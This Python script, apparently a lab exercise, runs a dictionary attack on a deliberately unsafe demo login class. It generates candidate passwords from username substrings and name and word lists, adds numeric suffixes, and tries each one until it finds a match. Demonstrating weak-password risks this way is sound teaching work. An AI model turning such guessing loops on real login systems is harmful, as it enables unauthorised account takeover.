from login_system_unsafe import LoginSystem

def number_run(p_list):
    p_list.extend([f"{i}123" for i in p_list])
    p_list.extend([f"{i}1234" for i in p_list])
    p_list.extend([f"{i}12345" for i in p_list])
    p_list.extend([f"123{i}" for i in p_list])
    p_list.extend([f"{i}{i}" for i in p_list])
    return None

def make_user_pass_file(user):
    # use the username and create possible passwords and store them in a list as strings
    p_list = []
    # take every substring of the username and add it to the list
    p_list.extend([user[:i] for i in range(0, len(user))])
    # take every substring of the username and add it to the list
    p_list.extend([user[i:] for i in range(0, len(user))])
    # take every substring of the username and add it to the list
    p_list.extend([user[i:j] for i in range(len(user)) for j in range(i, len(user)+1)])
    # also run these through with '123' appended to them
    number_run(p_list)
    # add all the elements of p_list to pre-existing names.txt file
    with open("user_pws.txt", "w") as w:
        for i in p_list:
            w.write(i)
            w.write("\n")
    return "user_pws.txt"
    
def dictionary_attack(user,ch, pwd=None):
    login_system = LoginSystem()  # Initialize the LoginSystem
    if ch==1:
        login_system.run(ch, user, pwd)
    elif ch==2:
        # create a file with all possible passwords
        f=make_user_pass_file(user)
        with open(f, 'r') as file:
            passwords = file.read().splitlines()
        # Read the dictionary files and store the passwords in a list
        with open('names.txt', 'r') as file:
            passwords.extend(file.read().splitlines())
        with open('words.txt', 'r') as file:
            passwords.extend(file.read().splitlines())
        with open('last_names.txt', 'r') as file:
            passwords.extend(file.read().splitlines())
        number_run(passwords)
        # Check if the password is in the list of passwords
        print(f"Trying {len(passwords)} passwords...")
        for i in passwords:
            # make sure the string in i is lower case
            i = i.lower()
            r = login_system.run(ch, user, i)  # Pass the instance of LoginSystem as self
            if r:
                print(f"Password found: {i}")
                print("Attack successful!")
                return None
            else:
                continue
        print("Password not found! Attack unsuccessful!")
    return None


if __name__ == "__main__":
    user= str(input("Enter username: "))
    pwd= str(input("Enter password: "))
    dictionary_attack(user, 1, pwd)
    dictionary_attack(user, 2)
